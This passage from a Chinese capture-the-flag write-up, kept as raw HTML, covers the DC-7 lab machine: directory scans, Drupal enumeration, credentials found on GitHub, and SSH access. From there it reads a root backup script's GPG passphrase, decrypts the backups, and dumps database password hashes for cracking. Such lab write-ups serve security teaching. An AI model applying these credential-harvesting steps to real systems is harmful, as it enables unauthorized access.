class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  376B  - /search  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/search/node    \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  376B  - /Search  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/search/node    \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  316B  - /sites  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/sites/          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  309B  - /sites/README.txt                                 \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  317B  - /themes  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/themes/        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  372B  - /user/  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/user/login      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -  372B  - /user  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/user/login\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /user/login/                                      \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    4KB - /web.config                                       \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  335B  - /wp-admin/install.php  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/wp-admin/core/install.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e把目录翻了半天没找到可利用的，在\u003ccode\u003egithub\u003c/code\u003e找了针对于\u003ccode\u003edrupal\u003c/code\u003e的工具尝试\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/immunIT/drupwn\"\u003ehttps://github.com/immunIT/drupwn\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e        ____\n       / __ \\_______  ______ _      ______\n      / / / / ___/ / / / __ \\ | /| / / __ \\\n     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /\n    /_____/_/   \\__,_/ .___/|__/|__/_/ /_/\n                     /_/    \n[-] Version \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e specified, trying to identify it\n[+] Version detected: \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e                                                                                                                                                                                        \n============ Users ============\n[+]***** (\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n[+]***** (\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)\n============ Default files ============\n[+] /README.txt (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e)\n[+] /LICENSE.txt (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e)\n[+] /robots.txt (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e)\n[+] /web.config (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e)\n[+] /update.php (\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e)\n[+] /install.php (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e)\n============ Nodes ============\nhttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/node/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nhttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/node/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\nhttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/node/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果也没啥用就是了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试弱口令，错误次数过多会被封禁\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eToo many failed login attempts \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e your IP address. This IP address \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e temporarily blocked. Try again later \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e request a new password. \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e想起作者说的话，虽然它是\u003ccode\u003e早期 DC 版本\u003c/code\u003e（我不会告诉你哪一个）的一种逻辑进展，但其中涉及一些新概念，但你需要自己弄清楚。:-) 如果你需要诉诸暴力破解或字典攻击，你可能不会成功\u003c/p\u003e\n\u003cp\u003e（而后我们尝试了暴力破解..）\u003c/p\u003e\n\u003cp\u003e早期DC版本，\u003ccode\u003eDC-1\u003c/code\u003e也是\u003ccode\u003eDrupal\u003c/code\u003e但是版本都不一样，漏洞估计也被修复了\u003c/p\u003e\n\u003cp\u003e没想法\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e看了下dalao们的WP，发现转折点在，页面底下的**\u003ccode\u003e@DC7USER\u003c/code\u003e** ，我们在GitHub搜索能搜索到\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Dc7User/staffdb\"\u003ehttps://github.com/Dc7User/staffdb\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e是DC7的一些代码，下面还说\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eThis \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e some \u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e (yes, it\u003cspan class=\"hljs-string\"\u003e's not the greatest code, but that wasn'\u003c/span\u003et the point) \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the DC-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e challenge.\n\nThis isn\u003cspan class=\"hljs-string\"\u003e't a flag, btw, but if you have made it here, well done anyway. :-)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e不按套路出牌属实是。。。我们查看下数据库配置文件\u003ccode\u003econfig.php\u003c/code\u003e ，获得数据库账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?php\n\t$servername = \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e;\n\t$username = \u003cspan class=\"hljs-string\"\u003e\"dc7user\"\u003c/span\u003e;\n\t$password = \u003cspan class=\"hljs-string\"\u003e\"MdR3xOgB7#dW\"\u003c/span\u003e;\n\t$dbname = \u003cspan class=\"hljs-string\"\u003e\"Staff\"\u003c/span\u003e;\n\t$conn = mysqli_connect($servername, $username, $password, $dbname);\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试后发现\u003ccode\u003essh\u003c/code\u003e可以登陆上去\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:~$ whoami\ndc7user\ndc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(dc7user) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(dc7user) groups=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(dc7user),\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e(cdrom),\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e(floppy),\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e(audio),\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e(dip),\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e(video),\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e(plugdev),\u003cspan class=\"hljs-number\"\u003e108\u003c/span\u003e(netdev)\ndc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:~$ uname -a\nLinux dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在当前\u003ccode\u003ehome\u003c/code\u003e目录下存在\u003ccode\u003embox\u003c/code\u003e文件，内容好像还是定期备份之类的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eFrom root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Fri Aug \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\nReturn-path: \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\u003e\nEnvelope-to: root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\nDelivery-date: Fri, \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nReceived: \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e root by dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e local (Exim \u003cspan class=\"hljs-number\"\u003e4.89\u003c/span\u003e)\n (envelope-\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\u003e)\n \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1i3O0y-0000Ed-To\n \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e; Fri, \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nFrom: root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (Cron Daemon)\nTo: root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\nSubject: Cron \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\u003e /opt/scripts/backups.sh\nMIME-Version: \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/plain; charset=UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nContent-Transfer-Encoding: 8bit\nX-Cron-Env: \u0026#x3C;PATH=/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/sbin:/usr/sbin\u003e\nX-Cron-Env: \u0026#x3C;SHELL=/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sh\u003e\nX-Cron-Env: \u0026#x3C;HOME=/root\u003e\nX-Cron-Env: \u0026#x3C;LOGNAME=root\u003e\nMessage-Id: \u0026#x3C;E1i3O0y-0000Ed-To@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\u003e\nDate: Fri, \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n\nrm: cannot remove \u003cspan class=\"hljs-string\"\u003e'/home/dc7user/backups/*'\u003c/span\u003e: No such file \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e directory\nDatabase dump saved to /home/dc7user/backups/website.sql               [success]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以知道脚本在\u003ccode\u003e/opt/scripts/backups.sh\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e并且当前目录下存在backups文件夹，里面是\u003ccode\u003ewebsite.sql .GPG\u003c/code\u003e ，\u003ccode\u003ewebsite.tar.gz.gpg\u003c/code\u003e（GPG是加密文件）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003e/opt/scripts/backups.sh\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\nrm /home/dc7user/backups/*\ncd /var/www/html/\ndrush sql-dump --result-file=/home/dc7user/backups/website.sql\ncd ..\ntar -czf /home/dc7user/backups/website.tar.gz html/\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz\nchown dc7user:dc7user /home/dc7user/backups/*\nrm /home/dc7user/backups/website.sql\nrm /home/dc7user/backups/website.tar.gz\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql \ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e--pinentry-mode loopback\u003c/code\u003e\u003c/strong\u003e：指定 GPG 使用命令行模式获取密码，而不是弹出窗口\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e--passphrase PickYourOwnPassword\u003c/code\u003e\u003c/strong\u003e：在此处直接提供密码（\u003ccode\u003ePickYourOwnPassword\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e--symmetric\u003c/code\u003e\u003c/strong\u003e：表示使用对称加密方法\u003c/p\u003e\n\u003cp\u003e是进行对称加密，并且直接给出了密码\u003ccode\u003ePickYourOwnPassword\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试解密，文件夹内两个文件都解密\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.tar.gz --decrypt /home/dc7user/backups/website.tar.gz.gpg\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e同样让 GPG 从命令行读取密码，使用加密时使用的密码，破解成功，并且收到一封邮件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:/opt/scripts$ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg\ngpg: AES256 encrypted data\ngpg: encrypted \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e passphrase\n\nYou have new mail \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /var/mail/dc7user\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们先查看破解出来的文件，内容太多应该没用，返回去看邮件，像是之前\u003ccode\u003embox\u003c/code\u003e里的内容，然后再查看\u003ccode\u003ewebsite.tar.gz\u003c/code\u003e ，解密后发现是整个\u003ccode\u003eHTML\u003c/code\u003e 的文件\u003c/p\u003e\n\u003cp\u003e查看数据库配置文件\u003ccode\u003esettings.php\u003c/code\u003e ,其实在\u003ccode\u003e/var/www\u003c/code\u003e里面也能看（搞这么麻烦感觉走错路了）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e  \u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'db7user'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'yNv3Po00'\u003c/span\u003e,\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录数据库成功，查询有用的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eMariaDB [d7db]\u003e select * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e users;\n+-----+--------------------------------------+----------+\n| uid | uuid                                 | langcode |\n+-----+--------------------------------------+----------+\n|   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | e813638d-3eb3-\u003cspan class=\"hljs-number\"\u003e4212\u003c/span\u003e-af40-171dd51023e9 | en       |\n|   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | fd93872d-a854-44cd-bb08-eb9a11e46492 | en       |\n|   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e | 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a | en       |\n+-----+--------------------------------------+----------+\n//\nMariaDB [d7db]\u003e select * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e users_field_data;\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n| uid | langcode | preferred_langcode | preferred_admin_langcode | name    | \u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n|   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567054076\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567054076\u003c/span\u003e |          \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e |          \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | NULL              |                \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e |\n|   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | en       | en                 | NULL                     | admin   | $S$Ead.KmIcT/yfKC\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003eH53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F | admin@example.com | Australia/Melbourne |      \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567054076\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567054076\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567098850\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567098643\u003c/span\u003e | admin@example.com |                \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e |\n|   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567057938\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1567057938\u003c/span\u003e |          \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e |          \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | dc7user@blah.com  |                \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e |\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试将\u003ccode\u003eusers_field_data\u003c/code\u003e 表的数据放到\u003ccode\u003ejohn\u003c/code\u003e爆破，没破解出来，寻找别的线索\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e仔细观察\u003ccode\u003ebackups.sh\u003c/code\u003e 里面使用了\u003ccode\u003edrush\u003c/code\u003e 命令去读取数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 帮助信息\u003c/span\u003e\ndc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:/opt/scripts$ drush -h\nDrush provides an extensive \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e system that describes both drush commands \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e topics of general interest.  Use `drush \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e --\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e` to present a \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of command categories to view, \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e `drush topic` \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a\n\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of topics that go more \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e-depth on how to use \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e extend drush.\n\nExamples:\n drush                                     \u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e commands.                                     \n drush --\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e=devel_generate             Show only commands defined \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e devel_generate.drush.inc \n drush \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e pm-download                    Show \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e one command.                             \n drush \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e dl                             Show \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e one command using an alias.              \n drush \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e --\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=html                  Show an HTML page detailing \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e available commands.    \n drush \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e --\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=json                  All available comamnds, \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a machine parseable \u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e.\n\nArguments:\n command                                   A command name, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e command alias.\n\nOptions:\n --field-labels                            Add field labels before first line of data. Default \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e on; use --no-field-labels to disable.                               \n --fields=\u0026#x3C;name, description\u003e              Fields to output. All available fields are: name, description.                                                             \n --\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e=[category]                       Restrict command \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e to those commands defined \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the specified file. Omit value to choose \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e a \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of names.          \n --\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=\u0026#x3C;json\u003e                           Select output \u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e. Available: table, csv, html, json, \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e, var_export, yaml. Default \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e table.                         \n --sort                                    Sort commands \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e alphabetical order. Drush waits \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e full bootstrap before printing \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e commands when this option \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e used.\n\nTopics:\n docs-readme                               README.md                                    \n docs-output-formats                       Output formatting options selection \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e use.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下文档 ：\u003ca 